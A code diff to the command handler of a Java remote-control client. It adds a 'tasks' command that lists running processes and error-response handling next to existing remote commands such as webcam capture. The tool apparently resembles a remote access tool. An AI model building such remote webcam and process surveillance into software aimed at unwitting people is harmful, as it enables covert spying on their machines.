@@ -2,7 +2,13 @@ package ch.lebois.client.handler;
 
 import ch.lebois.client.configure.ClientValues;
 import ch.lebois.client.console.Console;
-import ch.lebois.client.service.*;
+import ch.lebois.client.service.DesktopService;
+import ch.lebois.client.service.DownloadService;
+import ch.lebois.client.service.ImageService;
+import ch.lebois.client.service.KillService;
+import ch.lebois.client.service.ListService;
+import ch.lebois.client.service.PrinterService;
+import ch.lebois.client.service.ProcessService;
 import ch.lebois.client.service.chat.Chat;
 
 import java.util.Collections;
@@ -22,7 +28,11 @@ public class CommandReader {
                             Collections.reverse(responses);
 
                             for (String commandResponse : responses) {
-                                new ResponseSender("response", commandResponse);
+                                if (command.startsWith(">ERROR")) {
+                                    new ResponseSender("error", commandResponse.replace(">ERROR", ""));
+                                } else {
+                                    new ResponseSender("response", commandResponse);
+                                }
                             }
                             new ResponseSender().reset();
                         } catch (NullPointerException e) {
@@ -74,6 +84,9 @@ public class CommandReader {
             new ResponseSender().reset();
         } else if (command.equals("webcam")) {
             new ImageService().sendImgBytes(new ImageService().webcamCapture());
+            new ResponseSender().reset();
+        } else if (command.equals("tasks")) {
+            new ProcessService().getRunningProcesses();
             new ResponseSender().reset();
         } else {
             isFunction = false;
